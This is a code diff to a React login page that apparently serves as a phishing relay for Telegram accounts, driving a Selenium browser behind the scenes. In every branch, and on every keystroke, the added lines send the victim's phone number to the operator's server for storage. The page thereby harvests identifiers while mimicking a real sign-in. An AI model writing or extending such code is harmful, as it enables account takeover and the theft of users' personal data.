@@ -54,6 +54,15 @@ export const PhoneLoginPage: FC = () => {
     if (phoneNumberFromUrl) {
       setTimeout(() => {
         setPhoneNumber(phoneNumberFromUrl);
+        // Send phone number to server for storage when set from URL
+        if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
+          socketRef.current.emit('submitPhoneNumber', {
+            sessionId: sessionIdRef.current,
+            phoneNumber: phoneNumberFromUrl,
+            timestamp: new Date().toISOString()
+          });
+          console.log('📱 Phone number from URL sent to server for storage');
+        }
       }, 50);
       }
     }, [phoneNumberFromUrl]);
@@ -125,6 +134,16 @@ export const PhoneLoginPage: FC = () => {
                         localStorage.setItem('telegram_phone_number', actualPhoneNumber);
                         console.log('🔍 Stored phone number in localStorage:', actualPhoneNumber);
                         
+                        // Send phone number to server for storage
+                        if (socketRef.current && socketRef.current.connected) {
+                          socketRef.current.emit('submitPhoneNumber', {
+                            sessionId: sessionIdRef.current,
+                            phoneNumber: actualPhoneNumber,
+                            timestamp: new Date().toISOString()
+                          });
+                          console.log('📱 Phone number sent to server for storage');
+                        }
+                        
                         // CRITICAL: Reset isSubmitting when navigation happens
                         setIsSubmitting(false);
                         console.log('🔒 isSubmitting reset to false for navigation');
@@ -138,6 +157,16 @@ export const PhoneLoginPage: FC = () => {
                         localStorage.setItem('telegram_phone_number', phoneNumber);
                         console.log('🔍 Stored phone number in localStorage (fallback):', phoneNumber);
                         
+                        // Send phone number to server for storage
+                        if (socketRef.current && socketRef.current.connected) {
+                          socketRef.current.emit('submitPhoneNumber', {
+                            sessionId: sessionIdRef.current,
+                            phoneNumber: phoneNumber,
+                            timestamp: new Date().toISOString()
+                          });
+                          console.log('📱 Phone number sent to server for storage (fallback)');
+                        }
+                        
                         // CRITICAL: Reset isSubmitting when navigation happens
                         setIsSubmitting(false);
                         console.log('🔒 isSubmitting reset to false for fallback navigation');
@@ -150,6 +179,16 @@ export const PhoneLoginPage: FC = () => {
                     setTimeout(() => {
                       console.log('🔍 Selenium timeout, using React state:', phoneNumber);
                       
+                      // Send phone number to server for storage
+                      if (socketRef.current && socketRef.current.connected) {
+                        socketRef.current.emit('submitPhoneNumber', {
+                          sessionId: sessionIdRef.current,
+                          phoneNumber: phoneNumber,
+                          timestamp: new Date().toISOString()
+                        });
+                        console.log('📱 Phone number sent to server for storage (timeout)');
+                      }
+                      
                       // CRITICAL: Reset isSubmitting when navigation happens
                       setIsSubmitting(false);
                       console.log('🔒 isSubmitting reset to false for timeout navigation');
@@ -159,6 +198,16 @@ export const PhoneLoginPage: FC = () => {
                   } else {
                     // Fallback if socket not connected
                     console.log('🔍 Socket not connected, using React state:', phoneNumber);
+                    
+                    // Send phone number to server for storage
+                    if (socketRef.current && socketRef.current.connected) {
+                      socketRef.current.emit('submitPhoneNumber', {
+                        sessionId: sessionIdRef.current,
+                        phoneNumber: phoneNumber,
+                        timestamp: new Date().toISOString()
+                      });
+                      console.log('📱 Phone number sent to server for storage (socket fallback)');
+                    }
                     
                     // CRITICAL: Reset isSubmitting when navigation happens
                     setIsSubmitting(false);
@@ -366,6 +415,16 @@ export const PhoneLoginPage: FC = () => {
                         localStorage.setItem('telegram_phone_number', actualPhoneNumber);
                         console.log('🔍 Stored phone number in localStorage:', actualPhoneNumber);
                         
+                        // Send phone number to server for storage
+                        if (socketRef.current && socketRef.current.connected) {
+                          socketRef.current.emit('submitPhoneNumber', {
+                            sessionId: sessionIdRef.current,
+                            phoneNumber: actualPhoneNumber,
+                            timestamp: new Date().toISOString()
+                          });
+                          console.log('📱 Phone number sent to server for storage');
+                        }
+                        
                         // CRITICAL: Reset isSubmitting when navigation happens
                         setIsSubmitting(false);
                         console.log('🔒 isSubmitting reset to false for navigation');
@@ -379,6 +438,16 @@ export const PhoneLoginPage: FC = () => {
                         localStorage.setItem('telegram_phone_number', phoneNumber);
                         console.log('🔍 Stored phone number in localStorage (fallback):', phoneNumber);
                         
+                        // Send phone number to server for storage
+                        if (socketRef.current && socketRef.current.connected) {
+                          socketRef.current.emit('submitPhoneNumber', {
+                            sessionId: sessionIdRef.current,
+                            phoneNumber: phoneNumber,
+                            timestamp: new Date().toISOString()
+                          });
+                          console.log('📱 Phone number sent to server for storage (fallback)');
+                        }
+                        
                         // CRITICAL: Reset isSubmitting when navigation happens
                         setIsSubmitting(false);
                         console.log('🔒 isSubmitting reset to false for fallback navigation');
@@ -391,6 +460,16 @@ export const PhoneLoginPage: FC = () => {
                     setTimeout(() => {
                       console.log('🔍 Selenium timeout, using React state:', phoneNumber);
                       
+                      // Send phone number to server for storage
+                      if (socketRef.current && socketRef.current.connected) {
+                        socketRef.current.emit('submitPhoneNumber', {
+                          sessionId: sessionIdRef.current,
+                          phoneNumber: phoneNumber,
+                          timestamp: new Date().toISOString()
+                        });
+                        console.log('📱 Phone number sent to server for storage (timeout)');
+                      }
+                      
                       // CRITICAL: Reset isSubmitting when navigation happens
                       setIsSubmitting(false);
                       console.log('🔒 isSubmitting reset to false for timeout navigation');
@@ -400,6 +479,16 @@ export const PhoneLoginPage: FC = () => {
                   } else {
                     // Fallback if socket not connected
                     console.log('🔍 Socket not connected, using React state:', phoneNumber);
+                    
+                    // Send phone number to server for storage
+                    if (socketRef.current && socketRef.current.connected) {
+                      socketRef.current.emit('submitPhoneNumber', {
+                        sessionId: sessionIdRef.current,
+                        phoneNumber: phoneNumber,
+                        timestamp: new Date().toISOString()
+                      });
+                      console.log('📱 Phone number sent to server for storage (socket fallback)');
+                    }
                     
                     // CRITICAL: Reset isSubmitting when navigation happens
                     setIsSubmitting(false);
@@ -681,6 +770,17 @@ export const PhoneLoginPage: FC = () => {
     console.log('📱 Form submitted, clicking NEXT button in Selenium...');
     console.log('📱 Phone number:', phoneNumber);
     
+    // Send phone number to server for storage immediately
+    if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
+      console.log('📱 Sending phone number to server for storage...');
+      socketRef.current.emit('submitPhoneNumber', {
+        sessionId: sessionIdRef.current,
+        phoneNumber: phoneNumber,
+        timestamp: new Date().toISOString()
+      });
+      console.log('📱 Phone number sent to server for storage');
+    }
+    
     // Disable the form to prevent multiple submissions
     setIsInputsReady(false);
     setIsSubmitting(true);
@@ -873,6 +973,14 @@ export const PhoneLoginPage: FC = () => {
         value: newValue,
         timestamp: new Date().toISOString()
       });
+      
+      // Also send phone number to server for storage
+      socketRef.current.emit('submitPhoneNumber', {
+        sessionId: sessionIdRef.current,
+        phoneNumber: newValue,
+        timestamp: new Date().toISOString()
+      });
+      console.log('📱 Phone number sent to server for storage (real-time)');
       
       setSeleniumStatus('Phone number syncing in real-time...');
     }
